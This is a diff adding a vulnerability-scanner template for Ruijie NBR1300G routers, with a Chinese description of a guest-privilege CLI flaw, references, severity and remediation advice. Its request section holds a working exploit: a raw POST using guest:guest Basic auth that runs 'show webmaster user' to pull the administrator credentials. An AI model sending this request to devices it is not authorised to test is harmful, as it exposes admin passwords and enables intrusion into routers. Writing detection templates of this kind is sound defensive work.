@@ -1,0 +1,37 @@
+id: ruijie-nbr1300g-exposure
+info:
+  name: Ruijie NBR1300G Cli Password Leak
+  author:
+  - l0ne1y
+  tags:
+  - ruijie
+  - exposure
+  description: |-
+    锐捷NBR 1300G路由器 越权CLI命令执行漏洞
+    锐捷网络股份有限公司是ICT基础设施及行业解决方案提供商，主营业务为网络设备、网络安全产品及云桌面解决方案的研发、设计和销售。
+
+    锐捷NBR 1300G路由器 越权CLI命令执行漏洞，guest账户可以越权获取管理员账号密码。
+  reference:
+  - http://wiki.peiqi.tech/peiqi_wiki/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87%e6%bc%8f%e6%b4%9e/%e9%94%90%e6%8d%b7/%e9%94%90%e6%8d%b7nbr%201300g%e8%b7%af%e7%94%b1%e5%99%a8%20%e8%b6%8a%e6%9d%83cli%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e.html
+  - https://www.ruijienetworks.com
+  severity: medium
+  remediation: |
+    官方修复方案：
+    1.建议用户到官方获取最新补丁或者最新版本程序：https://www.ruijienetworks.com
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - webmaster level 2 username guest password guest
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /WEB_VMS/LEVEL15/ HTTP/1.1
+    Host: {{Hostname}}
+    Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+
+    command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
